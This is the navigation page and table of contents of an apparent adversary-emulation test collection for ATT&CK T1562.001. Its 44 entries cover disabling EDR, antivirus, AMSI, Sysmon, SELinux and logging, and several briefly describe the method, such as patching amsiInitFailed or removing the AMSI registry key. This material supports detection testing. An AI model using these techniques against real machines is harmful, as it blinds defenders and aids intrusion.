  <span class="fa-solid fa-bars"></span>
</label></div>
      
    </div>
  
  
    <div class="header-article-items__end">
      
        <div class="header-article-item">

<div class="article-header-buttons">





<div class="dropdown dropdown-download-buttons">
  <button class="btn dropdown-toggle" type="button" data-bs-toggle="dropdown" aria-expanded="false" aria-label="Download this page">
    <i class="fas fa-download"></i>
  </button>
  <ul class="dropdown-menu">
      
      
      
      <li><a href="../../_sources/tactics/defense-evasion/T1562.001.ipynb" target="_blank"
   class="btn btn-sm btn-download-source-button dropdown-item"
   title="Download source file"
   data-bs-placement="left" data-bs-toggle="tooltip"
>
  

<span class="btn__icon-container">
  <i class="fas fa-file"></i>
  </span>
<span class="btn__text-container">.ipynb</span>
</a>
</li>
      
      
      
      
      <li>
<button onclick="window.print()"
  class="btn btn-sm btn-download-pdf-button dropdown-item"
  title="Print to PDF"
  data-bs-placement="left" data-bs-toggle="tooltip"
>
  

<span class="btn__icon-container">
  <i class="fas fa-file-pdf"></i>
  </span>
<span class="btn__text-container">.pdf</span>
</button>
</li>
      
  </ul>
</div>




<button onclick="toggleFullScreen()"
  class="btn btn-sm btn-fullscreen-button"
  title="Fullscreen mode"
  data-bs-placement="bottom" data-bs-toggle="tooltip"
>
  

<span class="btn__icon-container">
  <i class="fas fa-expand"></i>
  </span>

</button>



<script>
document.write(`
  <button class="btn btn-sm navbar-btn theme-switch-button" title="light/dark" aria-label="light/dark" data-bs-placement="bottom" data-bs-toggle="tooltip">
    <span class="theme-switch nav-link" data-mode="light"><i class="fa-solid fa-sun fa-lg"></i></span>
    <span class="theme-switch nav-link" data-mode="dark"><i class="fa-solid fa-moon fa-lg"></i></span>
    <span class="theme-switch nav-link" data-mode="auto"><i class="fa-solid fa-circle-half-stroke fa-lg"></i></span>
  </button>
`);
</script>


<script>
document.write(`
  <button class="btn btn-sm navbar-btn search-button search-button__button" title="Search" aria-label="Search" data-bs-placement="bottom" data-bs-toggle="tooltip">
    <i class="fa-solid fa-magnifying-glass fa-lg"></i>
  </button>
`);
</script>
<label class="sidebar-toggle secondary-toggle btn btn-sm" for="__secondary"title="Toggle secondary sidebar" data-bs-placement="bottom" data-bs-toggle="tooltip">
    <span class="fa-solid fa-list"></span>
</label>
</div></div>
      
    </div>
  
</div>
</div>
              
              

<div id="jb-print-docs-body" class="onlyprint">
    <h1>T1562.001 - Disable or Modify Tools</h1>
    <!-- Table of contents -->
    <div id="print-main-content">
        <div id="jb-print-toc">
            
            <div>
                <h2> Contents </h2>
            </div>
            <nav aria-label="Page">
                <ul class="visible nav section-nav flex-column">
<li class="toc-h2 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-tests">Atomic Tests</a><ul class="nav section-nav flex-column">
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-1-disable-syslog">Atomic Test #1 - Disable syslog</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#dependencies-run-with-sh">Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">sh</span></code>!</a><ul class="nav section-nav flex-column">
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#description-package-with-rsyslog-must-be-on-system">Description: Package with rsyslog must be on system</a></li>
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#check-prereq-commands">Check Prereq Commands:</a></li>
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#get-prereq-commands">Get Prereq Commands:</a></li>
</ul>
</li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#attack-commands-run-with-sh">Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">sh</span></code></a></li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#cleanup">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-2-disable-syslog-freebsd-disables-syslog-collection">Atomic Test #2 - Disable syslog (freebsd)Disables syslog collection</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id1">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-3-disable-cb-responsedisable-the-cb-response-service">Atomic Test #3 - Disable Cb ResponseDisable the Cb Response service</a></li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-4-disable-selinux">Atomic Test #4 - Disable SELinux</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id2">Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">sh</span></code>!</a><ul class="nav section-nav flex-column">
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#description-selinux-must-be-installed">Description: SELinux must be installed</a></li>
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#id3">Check Prereq Commands:</a></li>
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#id4">Get Prereq Commands:</a></li>
</ul>
</li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id5">Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">sh</span></code></a></li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id6">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-5-stop-crowdstrike-falcon-on-linuxstop-and-disable-crowdstrike-falcon-on-linux">Atomic Test #5 - Stop Crowdstrike Falcon on LinuxStop and disable Crowdstrike Falcon on Linux</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id7">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-6-disable-carbon-black-responsedisables-carbon-black-response">Atomic Test #6 - Disable Carbon Black ResponseDisables Carbon Black Response</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id8">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-7-disable-littlesnitchdisables-littlesnitch">Atomic Test #7 - Disable LittleSnitchDisables LittleSnitch</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id9">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-8-disable-opendns-umbrelladisables-opendns-umbrella">Atomic Test #8 - Disable OpenDNS UmbrellaDisables OpenDNS Umbrella</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id10">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-9-disable-macos-gatekeeperdisables-macos-gatekeeper">Atomic Test #9 - Disable macOS GatekeeperDisables macOS Gatekeeper</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id11">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-10-stop-and-unload-crowdstrike-falcon-on-macosstop-and-unload-crowdstrike-falcon-daemons-falcond-and-userdaemon-on-macos">Atomic Test #10 - Stop and unload Crowdstrike Falcon on macOSStop and unload Crowdstrike Falcon daemons falcond and userdaemon on macOS</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id12">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-11-unload-sysmon-filter-driver">Atomic Test #11 - Unload Sysmon Filter Driver</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#dependencies-run-with-powershell">Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code>!</a><ul class="nav section-nav flex-column">
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#description-sysmon-must-be-downloaded">Description: Sysmon must be downloaded</a></li>
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#id13">Check Prereq Commands:</a></li>
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#id14">Get Prereq Commands:</a></li>
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#description-sysmon-must-be-installed">Description: sysmon must be Installed</a></li>
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#id15">Check Prereq Commands:</a></li>
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#id16">Get Prereq Commands:</a></li>
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#description-sysmon-filter-must-be-loaded">Description: sysmon filter must be loaded</a></li>
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#id17">Check Prereq Commands:</a></li>
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#id18">Get Prereq Commands:</a></li>
</ul>
</li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#attack-commands-run-with-command-prompt">Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code></a></li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id19">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-12-uninstall-sysmon">Atomic Test #12 - Uninstall Sysmon</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id20">Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code>!</a><ul class="nav section-nav flex-column">
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#description-sysmon-executable-must-be-available">Description: Sysmon executable must be available</a></li>
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#id21">Check Prereq Commands:</a></li>
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#id22">Get Prereq Commands:</a></li>
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#id23">Description: Sysmon must be installed</a></li>
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#id24">Check Prereq Commands:</a></li>
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#id25">Get Prereq Commands:</a></li>
</ul>
</li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id26">Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code></a></li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id27">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-13-amsi-bypass-amsi-initfailedany-easy-way-to-bypass-amsi-inspection-is-it-patch-the-dll-in-memory-setting-the-amsiinitfailed-function-to-true">Atomic Test #13 - AMSI Bypass - AMSI InitFailedAny easy way to bypass AMSI inspection is it patch the dll in memory setting the “amsiInitFailed” function to true.</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id28">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-14-amsi-bypass-remove-amsi-provider-reg-keywith-administrative-rights-an-adversary-can-remove-the-amsi-provider-registry-key-in-hklm-software-microsoft-amsi-to-disable-amsi-inspection">Atomic Test #14 - AMSI Bypass - Remove AMSI Provider Reg KeyWith administrative rights, an adversary can remove the AMSI Provider registry key in HKLM\Software\Microsoft\AMSI to disable AMSI inspection.</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id29">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-15-disable-arbitrary-security-windows-servicewith-administrative-rights-an-adversary-can-disable-windows-services-related-to-security-products-this-test-requires-mcafeedlpagentservice-to-be-installed">Atomic Test #15 - Disable Arbitrary Security Windows ServiceWith administrative rights, an adversary can disable Windows Services related to security products. This test requires McAfeeDLPAgentService to be installed.</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id30">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-16-tamper-with-windows-defender-atp-powershellattempting-to-disable-scheduled-scanning-and-other-parts-of-windows-defender-atp-upon-execution-virus-and-threat-protection-will-show-as-disabled">Atomic Test #16 - Tamper with Windows Defender ATP PowerShellAttempting to disable scheduled scanning and other parts of windows defender atp. Upon execution Virus and Threat Protection will show as disabled</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id31">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-17-tamper-with-windows-defender-command-promptattempting-to-disable-scheduled-scanning-and-other-parts-of-windows-defender-atp-these-commands-must-be-run-as-system-so-they-still-fail-as-administrator">Atomic Test #17 - Tamper with Windows Defender Command PromptAttempting to disable scheduled scanning and other parts of windows defender atp. These commands must be run as System, so they still fail as administrator.</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id32">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-18-tamper-with-windows-defender-registrydisable-windows-defender-from-starting-after-a-reboot-upen-execution-if-the-computer-is-rebooted-the-entire-virus-and-threat-protection-window-in-settings-will-be">Atomic Test #18 - Tamper with Windows Defender RegistryDisable Windows Defender from starting after a reboot. Upen execution, if the computer is rebooted the entire Virus and Threat protection window in Settings will be</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id33">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-19-disable-microsoft-office-security-featuresgorgon-group-may-disable-office-security-features-so-that-their-code-can-run-upon-execution-an-external-document-will-not">Atomic Test #19 - Disable Microsoft Office Security FeaturesGorgon group may disable Office security features so that their code can run. Upon execution, an external document will not</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id34">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-20-remove-windows-defender-definition-filesremoving-definition-files-would-cause-atp-to-not-fire-for-antimalware-check-mpcmdrun-exe-man-page-for-info-on-all-arguments">Atomic Test #20 - Remove Windows Defender Definition FilesRemoving definition files would cause ATP to not fire for AntiMalware. Check MpCmdRun.exe man page for info on all arguments.</a></li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-21-stop-and-remove-arbitrary-security-windows-servicebeginning-with-powershell-6-0-the-stop-service-cmdlet-sends-a-stop-message-to-the-windows-service-controller-for-each-of-the-specified-services-the-remove-service-cmdlet-removes-a-windows-service-in-the-registry-and-in-the-service-database">Atomic Test #21 - Stop and Remove Arbitrary Security Windows ServiceBeginning with Powershell 6.0, the Stop-Service cmdlet sends a stop message to the Windows Service Controller for each of the specified services. The Remove-Service cmdlet removes a Windows service in the registry and in the service database.</a></li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-22-uninstall-crowdstrike-falcon-on-windowsuninstall-crowdstrike-falcon-if-the-windowssensor-exe-path-is-not-provided-as-an-argument-we-need-to-search-for-it-since-the-executable-is-located-in-a-folder-named-with-a-random-guid-we-need-to-identify-it-before-invoking-the-uninstaller">Atomic Test #22 - Uninstall Crowdstrike Falcon on WindowsUninstall Crowdstrike Falcon. If the WindowsSensor.exe path is not provided as an argument we need to search for it. Since the executable is located in a folder named with a random guid we need to identify it before invoking the uninstaller.</a></li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-23-tamper-with-windows-defender-evade-scanning-foldermalware-can-exclude-a-specific-path-from-being-scanned-and-evading-detection">Atomic Test #23 - Tamper with Windows Defender Evade Scanning -FolderMalware can exclude a specific path from being scanned and evading detection.</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id35">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-24-tamper-with-windows-defender-evade-scanning-extensionmalware-can-exclude-specific-extensions-from-being-scanned-and-evading-detection">Atomic Test #24 - Tamper with Windows Defender Evade Scanning -ExtensionMalware can exclude specific extensions from being scanned and evading detection.</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id36">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-25-tamper-with-windows-defender-evade-scanning-processmalware-can-exclude-specific-processes-from-being-scanned-and-evading-detection">Atomic Test #25 - Tamper with Windows Defender Evade Scanning -ProcessMalware can exclude specific processes from being scanned and evading detection.</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id37">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-26-office-365-disable-antiphishrule">Atomic Test #26 - office-365-Disable-AntiPhishRule</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id38">Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code>!</a><ul class="nav section-nav flex-column">
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#description-exchangeonlinemanagement-powershell-module-must-be-installed">Description: ExchangeOnlineManagement PowerShell module must be installed</a></li>
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#id39">Check Prereq Commands:</a></li>
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#id40">Get Prereq Commands:</a></li>
</ul>
</li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#attack-commands-run-with-powershell">Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code></a></li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id41">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-27-disable-windows-defender-with-dismthe-following-atomic-will-attempt-to-disable-windows-defender-using-the-built-in-dism-exe-deployment-image-servicing-and-management-tool">Atomic Test #27 - Disable Windows Defender with DISMThe following Atomic will attempt to disable Windows-Defender using the built in DISM.exe, Deployment Image Servicing and Management tool.</a></li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-28-disable-defender-using-nirsoft-advancedrun">Atomic Test #28 - Disable Defender Using NirSoft AdvancedRun</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id42">Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code>!</a><ul class="nav section-nav flex-column">
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#description-advancedrun-exe-must-exist-at-advancedrun-location">Description: Advancedrun.exe must exist at #{AdvancedRun_Location}</a></li>
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#id43">Check Prereq Commands:</a></li>
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#id44">Get Prereq Commands:</a></li>
</ul>
</li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id45">Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code></a></li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id46">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-29-kill-antimalware-protected-processes-using-backstab">Atomic Test #29 - Kill antimalware protected processes using Backstab</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id47">Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code>!</a><ul class="nav section-nav flex-column">
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#description-backstab64-exe-should-exist-in-extrnalpayloads-directory">Description: Backstab64.exe should exist in ExtrnalPayloads Directory</a></li>
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#id48">Check Prereq Commands:</a></li>
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#id49">Get Prereq Commands:</a></li>
</ul>
</li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id50">Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code></a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-30-winpwn-kill-the-event-log-services-for-stealthkill-the-event-log-services-for-stealth-via-function-of-winpwnsupported-platforms-windows-attack-commands-run-with-powershell">Atomic Test #30 - WinPwn - Kill the event log services for stealthKill the event log services for stealth via function of WinPwn<strong>Supported Platforms:</strong> windows#### Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code></a></li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-31-tamper-with-windows-defender-atp-using-aliases-powershellattempting-to-disable-scheduled-scanning-and-other-parts-of-windows-defender-atp-using-set-mppreference-aliases-upon-execution-virus-and-threat-protection-will-show-as-disabled">Atomic Test #31 - Tamper with Windows Defender ATP using Aliases - PowerShellAttempting to disable scheduled scanning and other parts of Windows Defender ATP using set-MpPreference aliases. Upon execution Virus and Threat Protection will show as disabled</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id51">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-32-lockbit-black-disable-privacy-settings-experience-using-registry-cmdlockbit-black-disable-privacy-settings-experience-using-registry">Atomic Test #32 - LockBit Black - Disable Privacy Settings Experience Using Registry -cmdLockBit Black - Disable Privacy Settings Experience Using Registry</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id52">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-33-lockbit-black-use-registry-editor-to-turn-on-automatic-logon-cmdlockbit-black-use-registry-editor-to-turn-on-automatic-logon">Atomic Test #33 - LockBit Black - Use Registry Editor to turn on automatic logon -cmdLockBit Black - Use Registry Editor to turn on automatic logon</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id53">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-34-lockbit-black-disable-privacy-settings-experience-using-registry-powershelllockbit-black-disable-privacy-settings-experience-using-registry">Atomic Test #34 - LockBit Black - Disable Privacy Settings Experience Using Registry -PowershellLockBit Black - Disable Privacy Settings Experience Using Registry</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id54">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-35-lockbit-black-use-registry-editor-to-turn-on-automatic-logon-powershelllockbit-black-use-registry-editor-to-turn-on-automatic-logon">Atomic Test #35 - Lockbit Black - Use Registry Editor to turn on automatic logon -PowershellLockbit Black - Use Registry Editor to turn on automatic logon</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id55">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-36-disable-windows-defender-with-pwsh-disable-windowsoptionalfeaturethe-following-atomic-will-attempt-to-disable-windows-defender-using-the-built-in-powershell-cmdlet-disable-windowsoptionalfeature-deployment-image-servicing-and-management-tool">Atomic Test #36 - Disable Windows Defender with PwSh Disable-WindowsOptionalFeatureThe following Atomic will attempt to disable Windows-Defender using the built in PowerShell cmdlet Disable-WindowsOptionalFeature, Deployment Image Servicing and Management tool.</a></li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-37-wmic-tamper-with-windows-defender-evade-scanning-folderthe-following-atomic-will-attempt-to-exclude-a-folder-within-defender-leveraging-wmi">Atomic Test #37 - WMIC Tamper with Windows Defender Evade Scanning FolderThe following Atomic will attempt to exclude a folder within Defender leveraging WMI</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id56">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-38-delete-windows-defender-scheduled-tasks">Atomic Test #38 - Delete Windows Defender Scheduled Tasks</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#dependencies-run-with-command-prompt">Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code>!</a><ul class="nav section-nav flex-column">
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#description-the-windows-defender-scheduled-tasks-must-be-backed-up-first">Description: The Windows Defender scheduled tasks must be backed up first</a></li>
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#id57">Check Prereq Commands:</a></li>
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#id58">Get Prereq Commands:</a></li>
</ul>
</li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id59">Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code></a></li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id60">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-39-clear-historyclear-shell-history-this-technique-only-affect-the-bash-shell-application">Atomic Test #39 - Clear HistoryClear Shell History. This technique only affect the bash shell application.</a></li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-40-suspend-historysuspend-shell-history-seen-in-awfulshred-wiper-https-unix-stackexchange-com-questions-10922-temporarily-suspend-bash-history-on-a-given-shell">Atomic Test #40 - Suspend Historysuspend Shell History seen in Awfulshred wiper- https://unix.stackexchange.com/questions/10922/temporarily-suspend-bash-history-on-a-given-shell</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id61">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-41-reboot-linux-host-via-kernel-system-requestreboot-system-via-system-request-seen-in-awfulshred-wiper">Atomic Test #41 - Reboot Linux Host via Kernel System Requestreboot system via system request seen in Awfulshred wiper.</a></li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-42-clear-pagging-cacheclear-pagging-cache-via-system-request-this-is-a-temporary-change-in-the-system-to-clear-paging-cache-this-technique-seen-in-awfulshred-wiper-as-part">Atomic Test #42 - Clear Pagging Cacheclear pagging cache via system request. This is a temporary change in the system to clear paging cache. This technique seen in Awfulshred wiper as part</a></li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-43-disable-memory-swapdisable-swapping-of-device-paging-that-impaire-the-compromised-host-to-swap-data-if-the-ram-is-full-awfulshred-wiper-used-this-technique-as-an-additional">Atomic Test #43 - Disable Memory Swapdisable swapping of device paging that impaire the compromised host to swap data if the RAM is full. Awfulshred wiper used this technique as an additional</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id62">Cleanup:</a></li>
</ul>
</li>
<li class="toc-h3 nav-item toc-entry"><a class="reference internal nav-link" href="#atomic-test-44-disable-hypervisor-enforced-code-integrity-hvci">Atomic Test #44 - Disable Hypervisor-Enforced Code Integrity (HVCI)</a><ul class="nav section-nav flex-column">
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id63">Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code>!</a><ul class="nav section-nav flex-column">
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#description-hvci-must-be-enabled">Description: HVCI must be enabled</a></li>
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#id64">Check Prereq Commands:</a></li>
<li class="toc-h5 nav-item toc-entry"><a class="reference internal nav-link" href="#id65">Get Prereq Commands:</a></li>
</ul>
</li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id66">Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code></a></li>
<li class="toc-h4 nav-item toc-entry"><a class="reference internal nav-link" href="#id67">Cleanup:</a></li>
</ul>
</li>
